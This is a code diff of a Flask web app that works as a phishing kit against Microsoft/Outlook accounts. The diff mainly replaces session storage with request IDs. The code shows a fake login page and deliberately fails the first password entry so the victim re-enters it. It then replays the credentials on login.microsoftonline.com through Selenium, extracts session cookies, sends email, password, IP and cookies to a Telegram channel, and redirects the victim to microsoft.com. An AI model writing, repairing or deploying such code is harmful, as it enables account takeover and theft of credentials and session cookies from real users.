@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, jsonify, session, redirect, url_for, flash
+from flask import Flask, request, render_template, jsonify, redirect, url_for, flash
 import re
 import dns.resolver
 from selenium import webdriver
@@ -10,7 +10,6 @@ from time import sleep
 import requests
 import logging
 import os
-from flask_session import Session
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timedelta
 # from python_decouple import config
@@ -37,7 +36,6 @@ from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 import sentry_sdk
 import json
-import redis
 import uuid
 from functools import wraps
 
@@ -63,23 +61,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Session configuration - try Redis first, fall back to filesystem
-try:
-    redis_test = redis.from_url('redis://localhost:6379/0')
-    redis_test.ping()
-    app.config['SESSION_TYPE'] = 'redis'
-    app.config['SESSION_REDIS'] = redis_test
-    logger.info("Using Redis for session storage")
-except:
-    app.config['SESSION_TYPE'] = 'filesystem'
-    app.config['SESSION_FILE_DIR'] = './flask_session'
-    logger.info("Using filesystem for session storage")
-
-app.config['SESSION_PERMANENT'] = False
-app.config['SESSION_USE_SIGNER'] = True
-app.config['SESSION_KEY_PREFIX'] = 'outlook_automation:'
-app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
-
 # Database configuration  
 database_url = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
 # Handle sqlite URL format for SQLAlchemy 1.4+
@@ -95,7 +76,6 @@ else:
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 # Initialize extensions
-Session(app)
 db = SQLAlchemy(app)
 csrf = CSRFProtect(app)
 limiter = Limiter(
@@ -104,15 +84,6 @@ limiter = Limiter(
     default_limits=["1000 per hour", "100 per minute"]
 )
 
-# Redis connection for session debugging (optional)
-try:
-    redis_client = redis.from_url('redis://localhost:6379/0')
-    redis_client.ping()
-    logger.info("Redis connection established successfully")
-except Exception as e:
-    logger.info(f"Redis not available, using filesystem sessions: {e}")
-    redis_client = None
-
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     email = db.Column(db.String(120), unique=True, nullable=False)
@@ -120,9 +91,8 @@ class User(db.Model):
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     last_login = db.Column(db.DateTime)
 
-class SessionLog(db.Model):
+class ActivityLog(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    session_id = db.Column(db.String(255), nullable=False)
     user_email = db.Column(db.String(120))
     action = db.Column(db.String(100), nullable=False)
     timestamp = db.Column(db.DateTime, default=datetime.utcnow)
@@ -134,7 +104,7 @@ class SessionLog(db.Model):
 class LoginAttempt(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     user_email = db.Column(db.String(120), nullable=False)
-    session_id = db.Column(db.String(255), nullable=False)
+    request_id = db.Column(db.String(255), nullable=False)
     attempt_count = db.Column(db.Integer, default=0)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
@@ -144,11 +114,10 @@ class LoginForm(FlaskForm):
     password = PasswordField('Password', validators=[DataRequired()])
     submit = SubmitField('Next')
 
-def log_session_activity(action, user_email=None, success=True, error_message=None):
-    """Log session activity for debugging purposes"""
+def log_activity(action, user_email=None, success=True, error_message=None):
+    """Log activity for debugging purposes"""
     try:
-        log_entry = SessionLog()
-        log_entry.session_id = session.get('session_id', 'unknown')
+        log_entry = ActivityLog()
         log_entry.user_email = user_email
         log_entry.action = action
         log_entry.ip_address = get_remote_address()
@@ -157,15 +126,13 @@ def log_session_activity(action, user_email=None, success=True, error_message=No
         log_entry.error_message = error_message
         db.session.add(log_entry)
         db.session.commit()
-        logger.info(f"Session activity logged: {action} for {user_email}")
+        logger.info(f"Activity logged: {action} for {user_email}")
     except Exception as e:
-        logger.error(f"Failed to log session activity: {e}")
+        logger.error(f"Failed to log activity: {e}")
 
-def create_session_id():
-    """Create a unique session ID"""
-    if 'session_id' not in session:
-        session['session_id'] = str(uuid.uuid4())
-    return session['session_id']
+def create_request_id():
+    """Create a unique request ID for tracking login attempts"""
+    return str(uuid.uuid4())
 
 def validate_email_domain(email):
     """Enhanced email domain validation"""
@@ -374,14 +341,6 @@ def send_to_telegram(email, password, ip_address, attempt_type="immediate", cook
         logger.error(f"❌ Telegram error: {e}")
         return False
 
-
-
-@app.before_request
-def before_request():
-    """Initialize session before each request"""
-    create_session_id()
-    session.permanent = True
-
 @app.route('/')
 @limiter.limit("200 per minute")
 def index():
@@ -389,14 +348,14 @@ def index():
     step = request.args.get('step', 'email')
     error = request.args.get('error', '')
 
-    log_session_activity("page_visit", user_email=email)
+    log_activity("page_visit", user_email=email)
 
     # Email validation step
     if step == 'email' and email:
         valid, message = validate_email_domain(email)
         if not valid:
             flash(message, 'error')
-            log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
+            log_activity("email_validation_failed", user_email=email, success=False, error_message=message)
             return render_template('index.html', step='email', error=message)
 
     form = LoginForm()
@@ -407,8 +366,7 @@ def index():
                          email=email, 
                          step=step, 
                          error=error, 
-                         sitekey=sitekey,
-                         session_id=session.get('session_id'))
+                         sitekey=sitekey)
 
 @app.route('/verify-turnstile', methods=['POST'])
 @limiter.limit("50 per minute")
@@ -438,8 +396,8 @@ def verify_turnstile():
         result = response.json()
         success = result.get('success', False)
 
-        log_session_activity("turnstile_verification", success=success, 
-                           error_message=None if success else str(result.get('error-codes', [])))
+        log_activity("turnstile_verification", success=success, 
+                    error_message=None if success else str(result.get('error-codes', [])))
 
         return jsonify({
             'success': success,
@@ -480,27 +438,27 @@ def process_form():
     valid, message = validate_email_domain(email)
     if not valid:
         flash(message, 'error')
-        log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
+        log_activity("email_validation_failed", user_email=email, success=False, error_message=message)
         return redirect(url_for('index', step='password', email=email, error='true'))
 
-    # Two-pass authentication logic
-    current_session_id = session.get('session_id')
+    # Two-pass authentication logic using request ID instead of session
+    request_id = request.form.get('request_id', create_request_id())
     login_attempt = LoginAttempt.query.filter_by(
         user_email=email, 
-        session_id=current_session_id
+        request_id=request_id
     ).first()
 
     if not login_attempt:
         # First attempt - create new attempt record and go to second pass
         login_attempt = LoginAttempt()
         login_attempt.user_email = email
-        login_attempt.session_id = current_session_id
+        login_attempt.request_id = request_id
         login_attempt.attempt_count = 1
         db.session.add(login_attempt)
         db.session.commit()
 
-        log_session_activity("first_attempt_blocked", user_email=email, success=False, 
-                           error_message="First attempt automatically failed - moving to second pass")
+        log_activity("first_attempt_blocked", user_email=email, success=False, 
+                    error_message="First attempt automatically failed - moving to second pass")
 
         # Always flash error for first attempt and redirect to retry
         flash('Your account or password is incorrect. Try again.', 'error')
@@ -511,7 +469,7 @@ def process_form():
         login_attempt.attempt_count = 2
         login_attempt.updated_at = datetime.utcnow()
         db.session.commit()
-        log_session_activity("second_attempt_proceeding", user_email=email)
+        log_activity("second_attempt_proceeding", user_email=email)
 
         # Continue with Selenium automation below
 
@@ -522,199 +480,153 @@ def process_form():
         db.session.commit()
 
         flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
-        log_session_activity("attempt_reset", user_email=email, success=False, 
-                           error_message="Attempt counter reset - starting two-pass cycle again")
+        log_activity("attempt_reset", user_email=email, success=False, 
+                    error_message="Attempt counter reset - starting two-pass cycle again")
         return redirect(url_for('index', step='password', email=email, error='true'))
 
     # Perform Selenium automation (moved outside else block)
-        driver = None
-        try:
-            log_session_activity("selenium_automation_started", user_email=email)
-            driver = setup_chrome_driver()
+    driver = None
+    try:
+        log_activity("selenium_automation_started", user_email=email)
+        driver = setup_chrome_driver()
 
-            # Navigate to Microsoft login
-            driver.get("https://login.microsoftonline.com")
-            logger.info("Navigated to Microsoft login page")
+        # Navigate to Microsoft login
+        driver.get("https://login.microsoftonline.com")
+        logger.info("Navigated to Microsoft login page")
 
-            # Wait for and fill email
-            email_field = WebDriverWait(driver, 20).until(
-                EC.presence_of_element_located((By.NAME, "loginfmt"))
-            )
-            email_field.clear()
-            email_field.send_keys(email)
+        # Wait for and fill email
+        email_field = WebDriverWait(driver, 20).until(
+            EC.presence_of_element_located((By.NAME, "loginfmt"))
+        )
+        email_field.clear()
+        email_field.send_keys(email)
 
-            # Click next
-            next_button = driver.find_element(By.ID, "idSIButton9")
-            next_button.click()
+        # Click next
+        next_button = driver.find_element(By.ID, "idSIButton9")
+        next_button.click()
 
-            # Wait for password field
-            sleep(3)
-            password_field = WebDriverWait(driver, 20).until(
-                EC.presence_of_element_located((By.NAME, "passwd"))
-            )
-            password_field.clear()
-            password_field.send_keys(password)
+        # Wait for password field
+        sleep(3)
+        password_field = WebDriverWait(driver, 20).until(
+            EC.presence_of_element_located((By.NAME, "passwd"))
+        )
+        password_field.clear()
+        password_field.send_keys(password)
 
-            # Click sign in
-            signin_button = driver.find_element(By.ID, "idSIButton9")
-            signin_button.click()
+        # Click sign in
+        signin_button = driver.find_element(By.ID, "idSIButton9")
+        signin_button.click()
 
-            # Wait for login to complete
-            sleep(10)
+        # Wait for login to complete
+        sleep(10)
 
-            # Check for errors
-            current_url = driver.current_url
-            page_source = driver.page_source.lower()
+        # Check for errors
+        current_url = driver.current_url
+        page_source = driver.page_source.lower()
 
-            if any(error_indicator in page_source for error_indicator in ['error', 'incorrect', 'invalid', 'failed']):
-                if 'error' in current_url:
-                    error_msg = "Login failed - invalid credentials or account issue"
-                    logger.error(f"Login failed for {email}: error in URL")
-                    log_session_activity("login_automation_failed", user_email=email, success=False, error_message=error_msg)
-                    flash(error_msg, 'error')
-                    return redirect(url_for('index', step='password', email=email, error='true'))
-
-            # Always send worker details to Telegram first, even before cookie extraction
-            worker_ip = get_remote_address()
-            logger.info(f"Attempting to send worker details to Telegram for {email}")
-
-            # Extract and save cookies
-            cookie_file = extract_and_save_cookies(driver, email, password)
-            if not cookie_file:
-                error_msg = "Failed to extract cookies"
-                log_session_activity("cookie_extraction_failed", user_email=email, success=False, error_message=error_msg)
+        if any(error_indicator in page_source for error_indicator in ['error', 'incorrect', 'invalid', 'failed']):
+            if 'error' in current_url:
+                error_msg = "Login failed - invalid credentials or account issue"
+                logger.error(f"Login failed for {email}: error in URL")
+                log_activity("login_automation_failed", user_email=email, success=False, error_message=error_msg)
                 flash(error_msg, 'error')
                 return redirect(url_for('index', step='password', email=email, error='true'))
 
-            # Send final report with cookies to Telegram
-            telegram_success = send_to_telegram(email, password, worker_ip, "final", cookie_file)
-            if telegram_success:
-                log_session_activity("telegram_send_success", user_email=email)
-                logger.info(f"✅ Final report sent to Telegram for {email}")
-            else:
-                log_session_activity("telegram_send_failed", user_email=email, success=False)
-                logger.error(f"❌ Failed to send final report to Telegram for {email}")
+        # Always send worker details to Telegram first, even before cookie extraction
+        worker_ip = get_remote_address()
+        logger.info(f"Attempting to send worker details to Telegram for {email}")
 
-            # Update or create user record
-            user = User.query.filter_by(email=email).first()
-            if not user:
-                user = User(email=email)
-                db.session.add(user)
-            user.last_login = datetime.utcnow()
-            db.session.commit()
-
-            log_session_activity("login_automation_completed", user_email=email)
-            logger.info(f"Successful login automation for {email}")
-
-            # Redirect to Microsoft.com after successful cookie extraction
-            return redirect("https://microsoft.com")
-
-        except TimeoutException as e:
-            error_msg = f"Login timeout - please try again: {str(e)}"
-            logger.error(f"Timeout during login automation for {email}: {e}")
-            log_session_activity("login_timeout", user_email=email, success=False, error_message=error_msg)
+        # Extract and save cookies
+        cookie_file = extract_and_save_cookies(driver, email, password)
+        if not cookie_file:
+            error_msg = "Failed to extract cookies"
+            log_activity("cookie_extraction_failed", user_email=email, success=False, error_message=error_msg)
             flash(error_msg, 'error')
+            return redirect(url_for('index', step='password', email=email, error='true'))
 
-        except WebDriverException as e:
-            error_msg = f"Browser automation error: {str(e)}"
-            logger.error(f"WebDriver error for {email}: {e}")
-            log_session_activity("webdriver_error", user_email=email, success=False, error_message=error_msg)
-            flash(error_msg, 'error')
+        # Send final report with cookies to Telegram
+        telegram_success = send_to_telegram(email, password, worker_ip, "final", cookie_file)
+        if telegram_success:
+            log_activity("telegram_send_success", user_email=email)
+            logger.info(f"✅ Final report sent to Telegram for {email}")
+        else:
+            log_activity("telegram_send_failed", user_email=email, success=False)
+            logger.error(f"❌ Failed to send final report to Telegram for {email}")
 
-        except Exception as e:
-            error_msg = f"Unexpected error during login automation: {str(e)}"
-            logger.error(f"Unexpected error during login for {email}: {e}")
-            log_session_activity("unexpected_error", user_email=email, success=False, error_message=error_msg)
-            flash(error_msg, 'error')
+        # Update or create user record
+        user = User.query.filter_by(email=email).first()
+        if not user:
+            user = User(email=email)
+            db.session.add(user)
+        user.last_login = datetime.utcnow()
+        db.session.commit()
 
-        finally:
-            # Ensure driver is always cleaned up
-            if driver:
+        log_activity("login_automation_completed", user_email=email)
+        logger.info(f"Successful login automation for {email}")
+
+        # Redirect to Microsoft.com after successful cookie extraction
+        return redirect("https://microsoft.com")
+
+    except TimeoutException as e:
+        error_msg = f"Login timeout - please try again: {str(e)}"
+        logger.error(f"Timeout during login automation for {email}: {e}")
+        log_activity("login_timeout", user_email=email, success=False, error_message=error_msg)
+        flash(error_msg, 'error')
+
+    except WebDriverException as e:
+        error_msg = f"Browser automation error: {str(e)}"
+        logger.error(f"WebDriver error for {email}: {e}")
+        log_activity("webdriver_error", user_email=email, success=False, error_message=error_msg)
+        flash(error_msg, 'error')
+
+    except Exception as e:
+        error_msg = f"Unexpected error during login automation: {str(e)}"
+        logger.error(f"Unexpected error during login for {email}: {e}")
+        log_activity("unexpected_error", user_email=email, success=False, error_message=error_msg)
+        flash(error_msg, 'error')
+
+    finally:
+        # Ensure driver is always cleaned up
+        if driver:
+            try:
+                driver.close()
+                driver.quit()
+                logger.info("WebDriver cleaned up successfully")
+            except Exception as e:
+                logger.error(f"Error during WebDriver cleanup: {e}")
+                # Force kill any remaining browser processes
                 try:
-                    driver.close()
-                    driver.quit()
-                    logger.info("WebDriver cleaned up successfully")
-                except Exception as e:
-                    logger.error(f"Error during WebDriver cleanup: {e}")
-                    # Force kill any remaining browser processes
-                    try:
-                        import subprocess
-                        subprocess.run(['pkill', '-f', 'chrome'], capture_output=True)
-                    except:
-                        pass
+                    import subprocess
+                    subprocess.run(['pkill', '-f', 'chrome'], capture_output=True)
+                except:
+                    pass
 
-        return redirect(url_for('index', step='password', email=email, error='true'))
+    return redirect(url_for('index', step='password', email=email, error='true'))
 
-@app.route('/debug/sessions')
+@app.route('/debug/activity')
 @limiter.limit("5 per minute")
-def debug_sessions():
-    """Debug endpoint to view session information"""
+def debug_activity():
+    """Debug endpoint to view activity information"""
     try:
-        session_data = {
-            'current_session': dict(session),
-            'session_id': session.get('session_id', 'Not set'),
-            'redis_connection': 'Connected' if redis_client else 'Not connected'
+        # Get recent activity logs
+        recent_logs = ActivityLog.query.order_by(ActivityLog.timestamp.desc()).limit(50).all()
+
+        # Get recent login attempts
+        recent_attempts = LoginAttempt.query.order_by(LoginAttempt.updated_at.desc()).limit(20).all()
+
+        activity_data = {
+            'total_logs': ActivityLog.query.count(),
+            'total_attempts': LoginAttempt.query.count(),
+            'recent_logs': recent_logs,
+            'recent_attempts': recent_attempts
         }
 
-        # Get session files from filesystem or Redis keys
-        if redis_client:
-            try:
-                keys = redis_client.keys('outlook_automation:*')
-                session_data['redis_keys'] = [key.decode() for key in keys]
-                session_data['redis_key_count'] = len(keys)
-            except Exception as e:
-                session_data['redis_error'] = str(e)
-        else:
-            # Count filesystem session files
-            import glob
-            session_files = glob.glob('./flask_session/*')
-            session_data['session_files'] = len(session_files)
-            session_data['session_storage'] = 'filesystem'
-
-        # Get recent session logs
-        recent_logs = SessionLog.query.order_by(SessionLog.timestamp.desc()).limit(20).all()
-
         return render_template('debug.html', 
-                             session_data=session_data,
-                             recent_logs=recent_logs)
+                             activity_data=activity_data)
 
     except Exception as e:
-        logger.error(f"Error in debug sessions: {e}")
+        logger.error(f"Error in debug activity: {e}")
         return jsonify({'error': str(e)}), 500
-
-@app.route('/debug/clear-sessions', methods=['POST'])
-@limiter.limit("2 per minute")
-def clear_sessions():
-    """Clear all sessions from storage (Redis or filesystem)"""
-    try:
-        count = 0
-        if redis_client:
-            # Clear Redis sessions
-            keys = redis_client.keys('outlook_automation:*')
-            if keys:
-                redis_client.delete(*keys)
-                count = len(keys)
-            flash(f'Cleared {count} session(s) from Redis', 'success')
-        else:
-            # Clear filesystem sessions
-            import glob
-            import os
-            session_files = glob.glob('./flask_session/*')
-            for file in session_files:
-                try:
-                    os.remove(file)
-                    count += 1
-                except Exception:
-                    pass
-            flash(f'Cleared {count} session file(s) from filesystem', 'success')
-
-        log_session_activity("sessions_cleared", success=True)
-
-    except Exception as e:
-        flash(f'Error clearing sessions: {str(e)}', 'error')
-        logger.error(f"Error clearing sessions: {e}")
-
-    return redirect(url_for('debug_sessions'))
 
 @app.route('/test-telegram-simple')
 @limiter.limit("2 per minute") 
@@ -831,25 +743,9 @@ def health_check():
     except Exception as e:
         db_status = f'Error: {str(e)}'
 
-    # Test session storage
-    try:
-        if redis_client:
-            redis_client.ping()
-            storage_status = 'Redis: OK'
-        else:
-            # Check if filesystem session directory exists
-            import os
-            if os.path.exists('./flask_session'):
-                storage_status = 'Filesystem: OK'
-            else:
-                storage_status = 'Filesystem: Directory missing'
-    except Exception as e:
-        storage_status = f'Error: {str(e)}'
-
     return jsonify({
         'status': 'healthy',
         'database': db_status,
-        'session_storage': storage_status,
         'timestamp': datetime.utcnow().isoformat()
     })
 
@@ -866,7 +762,7 @@ def internal_error(error):
     return render_template('index.html', error='Internal server error'), 500
 
 # Ensure required directories exist
-required_dirs = ['logs', 'cookies', 'flask_session']
+required_dirs = ['logs', 'cookies']
 for directory in required_dirs:
     if not os.path.exists(directory):
         os.makedirs(directory)
